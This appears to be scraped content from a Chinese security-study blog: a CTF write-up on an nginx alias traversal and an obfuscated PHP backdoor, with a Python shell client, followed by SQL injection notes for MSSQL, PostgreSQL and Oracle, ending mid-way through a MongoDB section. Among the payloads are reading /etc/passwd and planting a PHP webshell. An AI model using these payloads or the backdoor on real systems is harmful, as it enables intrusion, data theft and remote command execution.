/web-img { alias /images/; autoindex on; } location ~* \\.(ini|docx|pcapng|doc)$ { deny all; } include /var/www/nginx[.]conf; } nginx配置 location /web-img { alias /images/; autoindex on; } 这是开发人员想让我们访问/web-img这个目录，但是没有在/web-img后面加/,导致我们可以构造/web-img../ 和alisa拼接起来就成了/images/web-img/../,造成目录穿越漏洞 访问/web-img…/目录 进入网站目录发现有备份文件，下载一下 &lt;?php $U='_/|U\",\"/-/|U\"),ar|Uray|U(\"/|U\",\"+\"),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle'; $q='s[|U$i]=\"\";$p=|U$ss($p,3);}|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s)){$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui'; $M='l=\"strtolower|U\";$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$'; $z='r=@$r[|U\"HTTP_R|UEFERER|U\"];$r|U|Ua=@$r[\"HTTP_A|U|UCCEPT_LAN|UGUAGE|U\"];if|U($r|Ur&amp;|U&amp;$ra){$u=parse_|Uurl($r'; $k='?:;q=0.([\\\\|Ud]))?,|U?/\",$ra,$m)|U;if($|Uq&amp;&amp;$m){|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=\"|Usubst|Ur\";|U|U$s'; $o='|U$l;|U){for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++){$o.=$t{$i}|U^$k|U{$j};}}|Ureturn $|Uo;}$r=$|U_SERV|UE|UR;$r'; $N='|Uf($e){$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(\"/'; $C='an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(\"|U&lt;$k&gt;$d&lt;/$k&gt;\"|U);@ses|U|Usion_des|Utroy();}}}}'; $j='$k|Uh=\"|U|U42f7\";$kf=\"e9ac\";fun|Uction|U |Ux($t,$k){$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U\"\";fo|Ur($i=0;$i&lt;'; $R=str_replace('rO','','rOcreatrOe_rOrOfurOncrOtion'); $J='kf|U),|U0,3));$p=\"|U\";for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0){$'; $x='r)|U;pa|Urse|U_str($u[\"qu|U|Uery\"],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(\"/([\\\\|U|Uw])[|U\\\\w-]+|U('; $f=str_replace('|U','',$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C); $g=create_function('',$f); $g(); ?&gt; create_function()函数 根据传递的参数创建匿名函数，并为其返回唯一名称。 语法： 1 create_function(string $args,string $code) 2 string $args 声明的函数变量部分 3 string $code 执行的方法代码部分 参考：PHP代码审计之create_function()函数 这里大佬说感觉是PHP混淆，随后他直接输出了f变量看到了代码部分 $kh = \"42f7\"; $kf = \"e9ac\"; function x($t, $k) { $c = strlen($k); $l = strlen($t); $o = \"\"; for ($i = 0; $i &lt; $l;) { for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) { $o. = $t { $i } ^ $k { $j }; } } return $o; } $r = $_SERVER; $rr = @$r[\"HTTP_REFERER\"]; $ra = @$r[\"HTTP_ACCEPT_LANGUAGE\"]; if ($rr &amp;&amp; $ra) { $u = parse_url($rr); parse_str($u[\"query\"], $q); $q = array_values($q); preg_match_all(\"/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/\", $ra, $m); if ($q &amp;&amp; $m) {@ session_start(); $s = &amp; $_SESSION; $ss = \"substr\"; $sl = \"strtolower\"; $i = $m[1][0].$m[1][1]; $h = $sl($ss(md5($i.$kh), 0, 3)); $f = $sl($ss(md5($i.$kf), 0, 3)); $p = \"\"; for ($z = 1; $z &lt; count($m[1]); $z++) $p. = $q[$m[2][$z]]; if (strpos($p, $h) === 0) { $s[$i] = \"\"; $p = $ss($p, 3); } if (array_key_exists($i, $s)) { $s[$i]. = $p; $e = strpos($s[$i], $f); if ($e) { $k = $kh.$kf; ob_start();@ eval(@gzuncompress(@x(@base64_decode(preg_replace(array(\"/_/\", \"/-/\"), array(\"/\", \"+\"), $ss($s[$i], 0, $e))), $k))); $o = ob_get_contents(); ob_end_clean(); $d = base64_encode(x(gzcompress($o), $k)); print(\"&lt;$k&gt;$d&lt;/$k&gt;\");@ session_destroy(); } } } } 到这里更一脸懵逼了，看wp说 这是一个后门页面,在网上找到了相关的利用教程: 一个PHP混淆后门的分析 根据题目修改后的脚本(修改了密钥和url)如下: # encoding: utf-8 from random import randint,choice from hashlib import md5 import urllib import string import zlib import base64 import requests import re def choicePart(seq,amount): length = len(seq) if length == 0 or length &lt; amount: print 'Error Input' return None result = [] indexes = [] count = 0 while count &lt; amount: i = randint(0,length-1) if not i in indexes: indexes.append(i) result.append(seq[i]) count += 1 if count == amount: return result def randBytesFlow(amount): result = '' for i in xrange(amount): result += chr(randint(0,255)) return result def randAlpha(amount): result = '' for i in xrange(amount): result += choice(string.ascii_letters) return result def loopXor(text,key): result = '' lenKey = len(key) lenTxt = len(text) iTxt = 0 while iTxt &lt; lenTxt: iKey = 0 while iTxt&lt;lenTxt and iKey&lt;lenKey: result += chr(ord(key[iKey]) ^ ord(text[iTxt])) iTxt += 1 iKey += 1 return result def debugPrint(msg): if debugging: print msg # config debugging = False keyh = \"42f7\" # $kh keyf = \"e9ac\" # $kf xorKey = keyh + keyf url = 'http://61.147.171.105:63612/hack.php' defaultLang = 'zh-CN' languages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','en-US;q=0.%d','en;q=0.%d'] proxies = None # {'http':'http://127.0.0.1:8080'} # proxy for debug sess = requests.Session() # generate random Accept-Language only once each session langTmp = choicePart(languages,3) indexes = sorted(choicePart(range(1,10),3), reverse=True) acceptLang = [defaultLang] for i in xrange(3): acceptLang.append(langTmp[i] % (indexes[i],)) acceptLangStr = ','.join(acceptLang) debugPrint(acceptLangStr) init2Char = acceptLang[0][0] + acceptLang[1][0] # $i md5head = (md5(init2Char + keyh).hexdigest())[0:3] md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8)) debugPrint('$i is %s' % (init2Char)) debugPrint('md5 head: %s' % (md5head,)) debugPrint('md5 tail: %s' % (md5tail,)) # Interactive php shell cmd = raw_input('phpshell &gt; ') while cmd != '': # build junk data in referer query = [] for i in xrange(max(indexes)+1+randint(0,2)): key = randAlpha(randint(3,6)) value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12))) query.append((key, value)) debugPrint('Before insert payload:') debugPrint(query) debugPrint(urllib.urlencode(query)) # encode payload payload = zlib.compress(cmd) payload = loopXor(payload,xorKey) payload = base64.urlsafe_b64encode(payload) payload = md5head + payload # cut payload, replace into referer cutIndex = randint(2,len(payload)-3) payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail) iPiece = 0 for i in indexes: query[i] = (query[i][0],payloadPieces[iPiece]) iPiece += 1 referer = url + '?' + urllib.urlencode(query) debugPrint('After insert payload, referer is:') debugPrint(query) debugPrint(referer) # send request r = sess.get(url,headers={'Accept-Language':acceptLangStr,'Referer':referer},proxies=proxies) html = r.text debugPrint(html) # process response pattern = re.compile(r'&lt;%s&gt;(.*)&lt;/%s&gt;' % (xorKey,xorKey)) output = pattern.findall(html) if len(output) == 0: print 'Error, no backdoor response' cmd = raw_input('phpshell &gt; ') continue output = output[0] debugPrint(output) output = output.decode('base64') output = loopXor(output,xorKey) output = zlib.decompress(output) print output cmd = raw_input('phpshell &gt; ') 拿到flag 随后本想着学习一波PHP混淆，结果真实开了眼，根本看不懂。。。 下去得思考一下如何学了 参考文章 攻防世界-WEB进阶区-Web_php_wrong_nginx_config [wp] 攻防世界 Web_php_wrong_nginx_config 【愚公系列】2023年06月 攻防世界-Web（Web_php_wrong_nginx_config） [Weevely：一个 PHP 混淆后门的代码分析] 攻防世界 web高手进阶区 7分题 Web_php_wrong_nginx_config","categories":["攻防世界"]},{"title":"sql注入学习--拓展","path":"/2023/10/15/sql-zhu-ru-tuo-zhan/","content":"0x01 前言 撰写本篇的目的是为了进一步了解一下sql注入的其他类型，mssql、postgresql、db2等等，主要是认为了解且会用手工注入才是前提也是重点，不能完全利用工具。因此写下本文来记录常规的、常见的数据库类型的相关注入payload，让自己以后遇到的时候不会懵逼。 0x02 Msssql 2.1 环境搭建 哎呀，这一块看着真麻烦，我本是想能实操就实操一下，但这么麻烦感觉还是算了，我初心只是想了解一下语句emmm，那就多用脑子想想吧。 下面都是跟着y4er师傅学习的┭┮﹏┭┮太强啦！！！ 2.2 自带库介绍 master //用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。 model //SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础 msdb //由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。 tempdb //它为临时表和其他临时工作提供了一个存储区。 其中最主要的是master数据库，其中存储了所有的数据库名等，还有很多存储过程 存储过程是一组为了完成特定功能的SQL 语句集，它存储在数据库中，一次编译后永久有效，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。实际上就是一个封装好的函数，具有面向对象特点。 在master数据库中有master.dbo.sysdatabases视图，储存所有数据库名,其他数据库的视图则储存他本库的表名与列名。 每一个库的视图表都有syscolumns存储着所有的字段，可编程性储存着我们的函数。 mssql的存储过程天然支持多语句，为我们的注入提供了遍历。 增删改查和MySQL数据库大同小异，具体可以自行w3c。 2.3 信息搜集 先来了解下mssql中有哪些角色/权限 以下摘自官网文档 这里留着日后有需要在查看，脑子里有个大概印象 服务器级的固定角色 描述 sysadmin sysadmin 固定服务器角色的成员可以在服务器上执行任何活动。 serveradmin serveradmin 固定服务器角色的成员可以更改服务器范围的配置选项和关闭服务器。 securityadmin securityadmin 固定服务器角色的成员可以管理登录名及其属性。 他们可以 GRANT、DENY 和 REVOKE 服务器级权限。 他们还可以 GRANT、DENY 和 REVOKE 数据库级权限（如果他们具有数据库的访问权限）。 此外，他们还可以重置 SQL Server 登录名的密码。 重要说明： 如果能够授予对 数据库引擎 的访问权限和配置用户权限，安全管理员可以分配大多数服务器权限。 securityadmin 角色应视为与 sysadmin 角色等效。 processadmin processadmin 固定服务器角色的成员可以终止在 SQL Server 实例中运行的进程。 setupadmin setupadmin 固定服务器角色的成员可以使用 Transact-SQL 语句添加和删除链接服务器。 （使用 Management Studio 时需要 sysadmin 成员资格。） bulkadmin bulkadmin 固定服务器角色的成员可以运行 BULK INSERT 语句。 diskadmin diskadmin 固定服务器角色用于管理磁盘文件。 dbcreator dbeator 固务器角色的成员可以创建、更改、删除和还原任何数据库。 puic 每个 SQL Server 登录名都属于 public 服务器角色。 如果未向某个服务器主体授予或拒绝对某个安全对象的特定权限，该用户将继承授予该对象的 public 角色的权限。 只有在希望所有用户都能使用对象时，才在对象上分配 Public 权限。 你无法更改具有 Public 角色的成员身份。 注意plic 与其他角色的实现方式不同，可通过 public 固定服务器角色授予、拒绝或调用权限。 固定数据库角色名 描述 db_owner db_owner 固定数据库角色的成员可以执行数据库的所有配置和维护活动，还可以删除 SQL Server中的数据库。 （在 SQL 数据库 和 SQL 数据仓库中，某些维护活动需要服务器级别权限，并且不能由 db_owners执行。） db_securityadmin db_securityadmin 固定数据库角色的成员可以仅修改自定义角色的角色成员资格、创建无登录名的用户和管理权限。 向此角色中添加主体可能会导致意外的权限升级。 db_accessadmin db_accessadmin 固定数据库角色的成员可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限。 db_backupoperator db_backupoperator 固定数据库角色的成员可以备份数据库。 db_ddladmin db_ddladmin 固定数据库角色的成员可以在数据库中运行任何数据定义语言 (DDL) 命令。 db_datawriter db_datawriter 固定数据库角色的成员可以在所有用户表中添加、删除或更改数据。 db_datareader db_datareader 固定数据库角色的成员可以从所有用户表中读取所有数据。 db_denydatawriter db_denydatawriter 固定数据库角色的成员不能添加、修改或删除数据库内用户表中的任何数据。 db_denydatareader db_denydatareader 固定数据库角色的成员不能读取数据库内用户表中的任何数据。 我们可以用IS_SRVROLEMEMBER来判断服务器级别的固定角色 返回值 描述 0 login 不是 role 的成员。 1 login 是 role 的成员。 NULL role 或 login 无效，或者没有查看角色成员身份的权限。 构造语句 and 1=(select is_srvrolemember('sysadmin')) and 1=(select is_srvrolemember('serveradmin')) and 1=(select is_srvrolemember('setupadmin')) and 1=(select is_srvrolemember('securityadmin')) and 1=(select is_srvrolemember('diskadmin')) and 1=(select is_srvrolemember('bulkadmin')) 数据库级别的应用角色用IS_MEMBER函数判断 SELECT IS_MEMBER('db_owner') 再来看一些基本信息 SELECT @@version; //版本 SELECT user; //用户 SELECT DB_NAME();\t//当前数据库名，你可以用db_name(n)来遍历出所有的数据库 SELECT @@servername;\t//主机名 那么站库分离可以这么来判断 select * from user where id='1'and host_name()=@@servername;--' 2.4 符号 注释符 /* -- ;%00 空白符号 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20\t--暂时不了解为什么 /**/ 运算 --基本的不列举了，举几个特殊的 ALL 如果一组的比较都为true，则比较结果为true AND 如果两个布尔表达式都为true，则结果为true；如果其中一个表达式为false，则结果为false ANY 如果一组的比较中任何一个为true，则结果为true BETWEEN 如果操作数在某个范围之内，那么结果为true EXISTS 如果子查询中包含了一些行，那么结果为true IN 如果操作数等于表达式列表中的一个，那么结果为true LIKE 如果操作数与某种模式相匹配，那么结果为true NOT 对任何其他布尔运算符的结果值取反 OR 如果两个布尔表达式中的任何一个为true，那么结果为true SOME 如果在一组比较中，有些比较为true，那么结果为true 2.5 基本注入流程 此处利用mssql数据类型不一样比较报错，爆出当前数据库名 SELECT * FROM Fanmv_Admin WHERE AdminID=1 and DB_NAME()&gt;1; 在将 nvarchar 值 ‘FanmvCMS’ 转换成数据类型 int 时失败。 爆表名 SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 name from sysobjects WHERE xtype='u'); 在将 nvarchar 值 ‘Fanmv_Admin’ 转换成数据类型 int 时失败。 此处xtype可以是下列对象类型中的一种： 缩写 全称 C CHECK 约束 D 默认值或 DEFAULT 约束 F FOREIGN KEY 约束 L 日志 FN 标量函数 IF 内嵌表函数 P 存储过程 PK PRIMARY KEY 约束（类型是 K） RF 复制筛选存储过程 S 系统表 TF 表函数 TR 触发器 U 用户表 UQ UNIQUE 约束（类型是 K） V 视图 X 扩展存储过程 此处的sysobjects等同于[master].[sys].[objects] 爆列名 SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'Fanmv_Admin')); 在将 nvarchar 值 ‘AdminID’ 转换成数据类型 int 时失败。 [22018] [Microsoft][SQL Server Native Client 10.0][SQL Server]在将 nvarchar 值 ‘AdminID’ 转换成数据类型 int 时失败。 (245) 爆数据 SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 AdminPass from Fanmv_Admin); 在将 varchar 值 ‘81FAAEN52MA16VBYT4Y1JJ3552BTC1640E7CF84345C86BA6’ 转换成数据类型 int 时失败。 当然，在mssql中也存在INFORMATION_SCHEMA，你也可以通过它来查询。 select * from INFORMATION_SCHEMA.TABLES select * from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='admin' and 1=(select top 1 table_name from information_schema.tables);-- 判断表名更方便的一种方式是使用having 1=1，GROUP BY SELECT * FROM Fanmv_Admin WHERE AdminID=1 having 1=1 选择列表中的列 ‘Fanmv_Admin.AdminID’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。 爆出一列，将其用group by 拼接进去继续往后爆其他的 SELECT * FROM Fanmv_Admin WHERE AdminID=1 GROUP BY AdminID having 1=1 选择列表中的列 ‘Fanmv_Admin.IsSystem’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。 SELECT * FROM Fanmv_Admin WHERE AdminID=1 GROUP BY AdminID,IsSystem having 1=1 选择列表中的列 ‘Fanmv_Admin.AdminName’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。 以此爆出所有字段 2.6 报错注入 其实基本注入流程中用到的就是报错注入，mssql中没有报错函数，报错注入利用的就是显式或隐式的类型转换来报错 先来看隐式报错 select * from admin where id =1 and (select user)&gt;0 user和0进行比较时就会报错 再来看显示报错，一般上显示报错用到的是cast和convert函数 select * from admin where id =1 (select CAST(USER as int)) select * from admin where id =1 (select convert(int,user)) 这里再来引入一个declare select * from admin where id =1;declare @a varchar(2000) set @a='select convert(int,user)' exec(@a); declare定义变量 set赋值exec执行 2.7 联合查询注入 mssql不用数字占位，因为可能会发生隐式转换，我们用null来占位，因为mssql数据库是个强类型的数据库，对数据格式比较严格。 （这里也是没搞懂发生隐式转换会如何，我猜测是转换后无法查询我们想让其查询的语句了） SELECT * from users where id=1 union select null,null,DB_NAME(); 你也可以这样来联合报错 SELECT * from users where id=1 union select null,null, (select CAST(db_name() as int)) 2.8 布尔盲注 SELECT * from users where id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1))=109 布尔盲注没有mysql那么多姿势，大同小异截取字符串比较 2.9 时间盲注 SELECT * from users where id=1;if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5' waitfor delay '0:0:5'是mssql的延时语法 同样可以用字符串截取来延时注入 select * from users where id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY '0:0:5' 0x03 PostgreSQL 3.1 环境搭建 这里比较建议用docker搭建（如果不赶时间的话），我这里也是懒得搭建了，依旧是跟着文章走一遍 3.2 验证注入 index.php?uid=1 AND 1=1 运行正常 index.php?uid=1 AND 1=2 运行异常 3.3 报错注入 这里也没去查，猜测是cast函数将select查询出的数据转换为了as语句后面的numeric数字型，导致报错 获取版本号： select * from tbuser where id=1 AND 7778=CAST((SELECT version())::text AS NUMERIC) 获取 Schemas 名称 select * from tbuser where id=1 AND 7778=CAST((SELECT schemaname FROM pg_tables limit 1)::text AS NUMERIC) 3.4 时间盲注 AND 6489=(SELECT 6489 FROM PG_SLEEP(5)) //延时 5 秒 3.5 堆叠注入 （多语句查询，stacked queries） ?uid=1;select PG_SLEEP(5)-- 3.6 联合注入 ?uid=1 order by 1,2,3 运行正常 ?uid=1 order by 1,2,3,4 运行异常，获取字段数 3 ?uid=1 UNION ALL SELECT NULL,('11111'),NULL-- 查看是否输出 11111 这里依旧是NULL而不用数字占用 获取数据库结构和内容，此处均为联合查询 获取模式名称（schemaname）名称 ?uid=1 UNION SELECT NULL,COALESCE(CAST(schemaname AS CHARACTER(10000)),(CHR(32))),NULL FROM pg_tables-- 语法解析： COALESCE(expression[,n]) coalesce 函数返回参数（列名）中第一个非 NULL 值的字段值，注意不是为空'' cast ('1' as numeric) 1 转换为数字类型 简化： ?uid=1 UNION SELECT NULL,schemaname,NULL FROM pg_tables-- 用户创建的数据库默认模式名称（schemaname）为 public 获取数据表名称 uid=1 UNION ALL SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname IN ('public') 获取表字段名称 ?uid=1 UNION SELECT NULL,attname,NULL FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum&gt;0 AND a.relname='tbuser' AND nspname='public'— 获取表内容 ?uid=1 UNION ALL SELECT NULL,id||','||username||','||passwd,NULL FROM public.tbuser-- 测列数： order by 4 and 1=2 union select null,null,null,null 测显位：第 2，3 and 1=2 union select 'null',null,null,null 错误 and 1=2 union select null,'null',null,null 正常 and 1=2 union select null,null,'null',null 正常 and 1=2 union select null,null,null,'null' 错误 获取信息： and 1=2 UNION SELECT null,version(),null,null and 1=2 UNION SELECT null,current_user,null,null and 1=2 union select null,current_database(),null,null 获取数据库名： and 1=2 union select null,string_agg(datname,','),null,null from pg_database 获取表名： 1、and 1=2 union select null,string_agg(tablename,','),null,null from pg_tables where schemaname='public' 2、and 1=2 union select null,string_agg(relname,','),null,null from pg_stat_user_tables 获取列名： and 1=2 union select null,string_agg(column_name,','),null,null from information_schema.columns where table_name='reg_users' 获取数据： and 1=2 union select null,string_agg(username,',')from reg_users 3.7 文件或目录操作 PostgreSQL 中部分内置函数、表 列目录——只能列安装目录下的文件 ?uid=1 union select NULL,NULL,pg_ls_dir('./') 读文件 这里是堆叠注入，注意分号 ?uid=1;CREATE TABLE passwd(t TEXT);COPY passwd FROM '/etc/passwd';SELECT NULL,t,NULL FROM passwd; 将要查询的数据放进了新建的t表，并最终读取 写文件 ?uid=1;DROP TABLE pass;（这里需要为数据库存在的表）CREATE TABLE hacktb (t TEXT);INSERT INTO hacktb(t) VALUES ('&lt;?php @system(\"$_GET[cmd]\");?&gt;');COPY hacktb(t) TO '/tmp/hack.php'; 0x04 Oracle 4.1 基本概念 Oracle和MySQL数据库语法大致相同，结构不太相同。最大的一个特点就是oracle可以调用Java代码。 对于“数据库”这个概念而言，Oracle采用了”表空间“的定义。数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库。当数据库创建时，Oracle 会默认创建五个表空间：SYSTEM、SYSAUX、USERS、UNDOTBS、TEMP： SYSTEM：看名字就知道这个用于是存储系统表和管理配置等基本信息 SYSAUX：类似于 SYSTEM，主要存放一些系统附加信息，以便减轻 SYSTEM 的空间负担 UNDOTBS：用于事务回退等 TEMP：作为缓存空间减少内存负担 USERS：就是存储我们定义的表和数据 ​ 在Oracle中每个表空间中均存在一张dual表，这个表是虚表，并没有实际的存储意义，它永远只存储一条数据，因为Oracle的SQL语法要求select后必须跟上from，所以我们通常使用dual来作为计算、查询时间等SQL语句中from之后的虚表占位，也就是select 1+1 from dual。 再来看Oracle中用户和权限划分：Oracle 中划分了许多用户权限，权限的集合称为角色。例如 CONNECT 角色具有连接到数据库权限，RESOURCE 能进行基本的增删改查，DBA 则集合了所有的用户权限。在创建数据库时，会默认启用 sys、system 等用户： sys：相当于 Linux 下的 root 用户。为 DBA 角色 system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 DBA 角色。 public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限） 4.2 基本语法 select column, group_function(column) from table [where condition] [group by group_by_expression] [having group_condition] [order by column]; Oracle要求select后必须指明要查询的表名，可以用dual。 Oracle使用 || 拼接字符串，MySQL中为或运算。 单引号和双引号在Oracle中虽然都是字符串，但是双引号可以用来消除关键字，比如sysdate。 Oracle中limit应该使用虚表中的rownum字段通过where条件判断。 Oracle中没有空字符，''和’null’都是null，而MySQL中认为''仍然是一个字符串。 Oracle对数据格式要求严格，比如union select的时候，放到下文讲。 Oracle的系统表： - dba_tables : 系统里所有的表的信息，需要DBA权限才能查询 - all_tables : 当前用户有权限的表的信息 - user_tables: 当前用户名下的表的信息 - DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表 - ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表 - USER_ALL_TABLES：某一用户所拥有的对象和表 DBA_TABLES &gt;= ALL_TABLES &gt;= USER_TABLES 4.3 信息搜集 从现在开始，我们以注入点http://localhost:8080/oracleInject/index?username=admin为例讲解。代码随便写一个jsp网页就行了。 获取数据库版本信息 http://localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%25') from dual -- + 获取操作系统版本信息 http://localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT banner FROM v$version where banner like 'TNS%25') from dual -- + 获取当前数据库 http://localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT name FROM v$database) from dual -- + 获取数据库用户 SELECT user FROM dual; 获取所有数据库用户 SELECT username FROM all_users; SELECT name FROM sys.user$; -- 需要高权限 获取当前用户权限 SELECT * FROM session_privs 获取当前用户有权限的所有数据库 SELECT DISTINCT owner, table_name FROM all_tables 获取表，all_tables类似于MySQL中的information_schema.tables，里面的结构可以自己构造sql语句。 SELECT * FROM all_tables; 获取字段名 SELECT column_name FROM all_tab_columns 在Oracle启动时，在 userenv 中存储了一些系统上下文信息，通过 SYS_CONTEXT 函数，我们可以取回相应的参数值。包括当前用户名等等。 SELECT SYS_CONTEXT（'USERENV'，'SESSION_USER'） from dual; 更多可用参数说明可以查阅 Oracle 提供的文档：SYS_CONTEXT 4.4 注入类型 4.4.1 联合查询 order by 猜字段数量，union select进行查询，需要注意的是每一个字段都需要对应前面select的数据类型(字符串/数字)。所以我们一般先使用null字符占位，然后逐位判断每个字段的类型，比如： http://localhost:8080/oracleInject/index?username=admin' union select null,null,null from dual -- 正常 http://localhost:8080/oracleInject/index?username=admin' union select 1,null,null from dual -- 正常说明第一个字段是数字型 http://localhost:8080/oracleInject/index?username=admin' union select 1,2,null from dual -- 第二个字段为数字时错误 http://localhost:8080/oracleInject/index?username=admin' union select 1,'asd',null from dual -- 正常 为字符串 依此类推 查数据库版本和用户名 http://localhost:8080/oracleInject/index?username=admin' union select 1,(select user from dual),(SELECT banner FROM v$version where banner like 'Oracle%25') from dual -- 查当前数据库 http://localhost:8080/oracleInject/index?username=admin' union select 1,(SELECT global_name FROM global_name),null from dual -- 查表，wmsys.wm_concat()等同于MySQL中的group_concat()，在11gr2和12C上已经抛弃，可以用LISTAGG()替代 http://localhost:8080/oracleInject/index?username=admin' union select 1,(select LISTAGG(table_name,',')within group(order by owner)name from all_tables where owner='SYSTEM'),null from dual -- 但是LISTAGG()返回的是varchar类型，如果数据表很多会出现字符串长度过长的问题。这个时候可以使用通过字符串截取来进行。 查字段 http://localhost:8080/oracleInject/index?username=admin' union select 1,(select column_name from all_tab_columns where table_name='TEST' and rownum=2),null from dual -- 有表名字段名出数据就不说了。 4.5 报错注入 4.5.1 utl_inaddr.get_host_name select utl_inaddr.get_host_name((select user from dual)) from dual; 11g之后，使用此函数的数据库用户需要有访问网络的权限 4.5.2 ctxsys.drithsx.sn select ctxsys.drithsx.sn(1, (select user from dual)) from dual; 处理文本的函数，参数错误时会报错。 4.5.3 CTXSYS.CTX_REPORT.TOKEN_TYPE select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), '123') from dual; 4.5.4 XMLType http://localhost:8080/oracleInject/index?username=admin' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null -- 注意url编码，如果返回的数据有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。 4.5.6 dbms_xdb_version.checkin select dbms_xdb_version.checkin((select user from dual)) from dual; 4.5.7 dbms_xdb_version.makeversioned select dbms_xdb_version.makeversioned((select user from dual)) from dual; 4.5.8 dbms_xdb_version.uncheckout select dbms_xdb_version.uncheckout((select user from dual)) from dual; 4.5.9 dbms_utility.sqlid_to_sqlhash SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual; 4.5.10 ordsys.ord_dicom.getmappingxpath select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual; 4.5.11 UTL_INADDR.get_host_name select UTL_INADDR.get_host_name((select user from dual)) from dual; 4.5.12 UTL_INADDR.get_host_address select UTL_INADDR.get_host_name('~'||(select user from dual)||'~') from dual; 剩下的参考下面的链接吧，这里只是做个记录 0x05 MongoDB 5.1 NoSQL与MongoDB基本概念 NoSQL NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。 NoSQL用于超大规模数据的存储。（例如谷歌或Facebook每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。 NoSQL 数据库分类 类型 部分代表 特点 列存储 HbaseCassandraHypertable 顾名思义，是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的IO优势。 文档存储 MongoDBCouchDB 文档存储一般用类似json的格式存储，存储的内容是文档型的。这样也就有机会对某些字段建立索引，实现关系数据库的某些功能。 key-value存储 Tokyo Cabinet / TyrantBerkeley DBMemcacheDBRedis 可以通过key快速查询到其value。一般来说，存储不管value的格式，照单全收。（Redis包含了其他功能） 图存储 Neo4JFlockDB 图形关系的最佳存储。使用传统关系数据库来解决的话性能低下，而且设计使用不方便。 对象存储 db4oVersant 通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。 xml数据库 Berkeley DB XMLBaseX 高效的存储XML数据，并支持XML的内部查询语法，比如XQuery,Xpath。 MongoDB MongoDB属于NoSQL数据库的一种，是由C++语言编写的一个基于分布式文件存储的开源数据库系统，旨在为Web应用提供可扩展的高性能数据存储解决方案。在高负载的情况下，添加更多的节点，可以保证服务器性能。 MongoDB 将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。 MongoDB概念解析 和关系型数据库的相关概念不一样，在MongoDB中基本的概念是文档、集合、数据库，如下表： SQL术语/概念 MongoDB术语/概念 解释/说明 database database 数据库 table collection 数据库表/集合 row document 数据记录行/文档 column field 数据字段/域 index index 索引 table joins 表连接,MongoDB不支持 primary key primary key 